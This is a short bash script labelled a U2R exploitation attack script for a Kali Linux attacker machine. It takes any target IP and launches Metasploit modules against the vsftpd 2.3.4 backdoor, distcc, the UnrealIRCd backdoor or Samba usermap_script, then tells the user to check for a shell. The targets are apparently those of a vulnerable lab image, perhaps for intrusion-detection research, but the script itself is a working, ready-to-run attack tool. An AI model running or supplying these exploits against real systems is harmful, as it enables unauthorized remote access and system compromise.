#!/bin/bash
# U2R (Exploitation) Attack Script
# For Kali Linux VM (Attacker Machine)

if [ $# -ne 2 ]; then
    echo "Usage: $0 <target_ip> <service>"
    echo "Available services: vsftpd, distcc, ircd, samba"
    exit 1
fi

TARGET_IP=$1
SERVICE=$2

echo "Starting U2R exploitation against $TARGET_IP targeting $SERVICE"

# Setup Metasploit Framework command prefix
MSF_CMD="msfconsole -q -x"

case $SERVICE in
    vsftpd)
        echo "Exploiting vsftpd 2.3.4 backdoor..."
        EXPLOIT="use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS $TARGET_IP; set RPORT 21; exploit"
        $MSF_CMD "$EXPLOIT"
        ;;
    distcc)
        echo "Exploiting distcc daemon..."
        EXPLOIT="use exploit/unix/misc/distcc_exec; set RHOSTS $TARGET_IP; set RPORT 3632; exploit"
        $MSF_CMD "$EXPLOIT"
        ;;
    ircd)
        echo "Exploiting UnrealIRCd backdoor..."
        EXPLOIT="use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS $TARGET_IP; set RPORT 6667; exploit"
        $MSF_CMD "$EXPLOIT"
        ;;
    samba)
        echo "Exploiting Samba vulnerability..."
        EXPLOIT="use exploit/multi/samba/usermap_script; set RHOSTS $TARGET_IP; set RPORT 445; exploit"
        $MSF_CMD "$EXPLOIT"
        ;;
    *)
        echo "Unknown service: $SERVICE"
        echo "Available options: vsftpd, distcc, ircd, samba"
        exit 1
        ;;
esac

echo "Exploitation attempt completed. Check for successful shell."
